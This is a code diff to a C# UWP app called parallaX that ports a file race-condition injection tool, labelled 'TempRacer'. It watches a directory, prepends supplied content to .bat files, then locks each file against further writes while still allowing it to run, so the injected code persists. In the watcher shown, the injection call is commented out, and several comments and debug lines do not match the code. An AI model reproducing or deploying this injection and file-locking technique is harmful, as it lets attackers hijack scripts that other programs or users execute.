@@ -20,6 +20,7 @@ using Windows.UI.Xaml.Media.Imaging;
 using Windows.UI.Xaml.Media;
 using Windows.UI;
 using Windows.UI.Xaml.Input;
+using System.Collections;
 
 namespace parallaX
 {
@@ -27,6 +28,12 @@ namespace parallaX
     // iNiT
     public sealed partial class MainPage : Page
     {
+        /* TESTING START */
+        public static int retryCounter = 3;
+        public static FileStream fsHandle = null;
+        public static ArrayList handleList = null;
+        public static ArrayList blackListedFiles = null;
+        /* TESTING END */
 
         static StringBuilder logStr = new StringBuilder();
         static StringBuilder rwxStr = new StringBuilder();
@@ -605,10 +612,125 @@ namespace parallaX
         }
         */
 
-        // EMPTY1
-        private async void empty1BTN_Click(object sender, RoutedEventArgs e)
+
+        /*
+         * Args:
+         *  string watchPath: Directory path to watch for changes
+         *  string filter: Filter filetypes to watch for changes, example: filter=".exe"
+         */
+        //[PermissionSet(SecurityAction.Demand, Name = "FullTrust")]
+        public static async void Run(string watchPath, string filter)
         {
-            //DefaultLaunch1();
+            // Create a new FileSystemWatcher and set its properties.
+            StorageFolder watcher = await StorageFolder.GetFolderFromPathAsync(watchPath);
+            // Clean huh ?
+            IEnumerable<string> fileTypeFilter = new[] { filter };
+            var queryOptions = new Windows.Storage.Search.QueryOptions(Windows.Storage.Search.CommonFileQuery.DefaultQuery,
+                                                                       fileTypeFilter);
+            var query = watcher.CreateItemQueryWithOptions(queryOptions);
+
+            // Add event handler
+            query.ContentsChanged += Query_ContentsChanged;
+
+            // Begin watch by getting items
+            IReadOnlyList<IStorageItem> bla = await watcher.GetItemsAsync();
+
+            Debug.WriteLine("[+] Watching " + watchPath + filter);
+        }
+
+        private static void Query_ContentsChanged(Windows.Storage.Search.IStorageQueryResultBase sender, object args)
+        {
+            var num = sender.GetItemCountAsync();
+            Debug.WriteLine("[+] Numbers of items changed: %d\n", num);
+            /*
+            // skip blacklisted files
+            if (blackListedFiles.Contains(e.FullPath))
+                return;
+
+            // Specify what is done when a file is changed, created, or deleted.
+            Debug.WriteLine("[+] File: " + e.FullPath + " " + e.ChangeType);
+            Inject(e.FullPath, newContent);
+            */
+        }
+
+        public static Boolean Inject(String target, String newContent)
+        {
+            // skip if blacklisted
+            if (blackListedFiles.Contains(target)) return false;
+
+            int i = 0;
+            while (i < retryCounter)
+            {
+                if (target.EndsWith(".bat")) // inject if .exe
+                {
+                    try
+                    {
+                        Debug.WriteLine("[+] Injecting into " + target);
+                        string currentContent = String.Empty;
+                        if (File.Exists(target)) currentContent = File.ReadAllText(target);
+                        File.WriteAllText(target, newContent + currentContent); //prepend our stuff
+                        Debug.WriteLine("[+] Done!");
+                    }
+                    catch (Exception)
+                    {
+                        /* ERROR */
+                        Debug.WriteLine("[-] Error reading/writing to file");
+                    }
+                }
+                try
+                {
+                    // Block file for writing, but allow read access (sharemode=read) to allow execution
+                    Debug.WriteLine("[+] Blocking " + target + " for further changes...");
+                    //Thread.Sleep(500); // wait a moment until file is free for us  
+                    fsHandle = File.Open(target, FileMode.Open, FileAccess.Write, FileShare.Read);
+                    handleList.Add(fsHandle); // keep our lock
+                    blackListedFiles.Add(target); // add file to blacklist
+                    return true;
+                }
+                catch (Exception)
+                {
+                    /* ERROR */
+                    Debug.WriteLine("[-] Error blocking file!");
+                    //Console.WriteLine(e.ToString());
+                }
+                i++;
+                //Thread.Sleep(1000);
+                Debug.WriteLine("[+] Retry #" + i.ToString() + "\r\b");
+            }
+            return false;
+        }
+
+        private static async Task<Boolean> canReadWrite(String path)
+        {
+            StorageFile f = await StorageFile.GetFileFromPathAsync(path);
+            if (!f.Attributes.HasFlag(Windows.Storage.FileAttributes.ReadOnly))
+            {
+                return true;
+            }
+            else
+            {
+                //Console.WriteLine(s.Message);
+                return false;
+            }
+        }
+
+        // EMPTY1
+        private void empty1BTN_Click(object sender, RoutedEventArgs e)
+        {
+            Debug.WriteLine("TempRacer v1.0 by alexander.georgiev@daloo.de  - UWP PORT\r\n");
+            try
+            {
+                // init
+                handleList = new ArrayList();
+                blackListedFiles = new ArrayList();
+
+                Debug.WriteLine("Testing started...\r\n");
+                Run("D:\\DevelopmentFiles\\VSRemoteTools\\x64\\", ".exe");
+            }
+            catch (Exception err)
+            {
+                Debug.WriteLine("[-] Error:\r\n" + err.ToString());
+            }
         }
 
         /*
